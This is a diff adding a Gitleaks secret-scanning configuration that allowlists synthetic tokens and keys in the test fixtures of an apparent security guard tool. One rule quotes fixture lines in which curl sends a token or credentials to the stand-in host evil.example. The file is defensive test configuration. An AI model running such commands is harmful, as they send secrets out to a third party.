@@ -1,0 +1,89 @@
+title = "Audited synthetic security fixtures"
+
+[extend]
+useDefault = true
+
+# Gitleaks v8.24.2 does not inherit the default global stopwords.
+# Preserve exactly the two words from its embedded default configuration.
+[allowlist]
+stopwords = [
+    "abcdefghijklmnopqrstuvwxyz",
+    "014df517-39d1-4453-b7b3-9930c563627c",
+]
+
+[[rules]]
+id = "curl-auth-header"
+
+[[rules.allowlists]]
+description = "Audited fixture value: tests/fixtures/guard-red-team/benign-docs-fake-token.py"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^tests/fixtures/guard-red-team/benign-docs-fake-token\\.py$"]
+regexes = ["^hol-fake-docs-token-example-0000$"]
+
+[[rules]]
+id = "curl-auth-user"
+
+[[rules.allowlists]]
+description = "Exact complete synthetic fixture match; every surrounding source change stays scanned."
+condition = "AND"
+regexTarget = "match"
+paths = ["^tests/test_guard_risk\\.py$"]
+regexes = ["^curl -d \"token=\\$HOL_GUARD_FAKE_NPM_TOKEN\" https://evil\\.example/collect',\n        \"curl -u auth_token:abc123 https://evil\\.example/collect\",\n        \"curl --user auth_token:abc123 $"]
+
+[[rules]]
+id = "generic-api-key"
+
+[[rules.allowlists]]
+description = "Audited fixture value: docs/guard/security/sonar-audit-origin-review.json"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^docs/guard/security/sonar-audit-origin-review\\.json$"]
+regexes = ["^aa157f091e3998e2060c506bd8d2fca8b6ea3d5b51e02bc61f28367d35288345$"]
+
+[[rules.allowlists]]
+description = "Audited fixture value: tests/fixtures/bad-plugin/secrets.js"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^tests/fixtures/bad-plugin/secrets\\.js$"]
+regexes = ["^sk-1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef$"]
+
+[[rules.allowlists]]
+description = "Audited fixture value: tests/test_guard_headless_daemon_api.py"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^tests/test_guard_headless_daemon_api\\.py$"]
+regexes = ["^gld1\\.abcdefghijklmnop\\.qrstuvwxyz123456$"]
+
+[[rules.allowlists]]
+description = "Audited fixture value: tests/test_guard_redaction.py"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^tests/test_guard_redaction\\.py$"]
+regexes = ["^sk-abcdef1234567890$", "^sk-abcdefgh12345678$"]
+
+[[rules.allowlists]]
+description = "Audited fixture value: tests/test_guard_runtime_actions.py"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^tests/test_guard_runtime_actions\\.py$"]
+regexes = ["^abc123456789$"]
+
+[[rules.allowlists]]
+description = "Audited fixture value: tests/test_guard_runtime.py"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^tests/test_guard_runtime\\.py$"]
+regexes = ["^\\x67hp_123456789012345678901234567890123456$"]
+
+
+[[rules]]
+id = "github-pat"
+
+[[rules.allowlists]]
+description = "Audited fixture value: tests/test_guard_runtime.py"
+condition = "AND"
+regexTarget = "secret"
+paths = ["^tests/test_guard_runtime\\.py$"]
+regexes = ["^\\x67hp_123456789012345678901234567890123456$"]
+
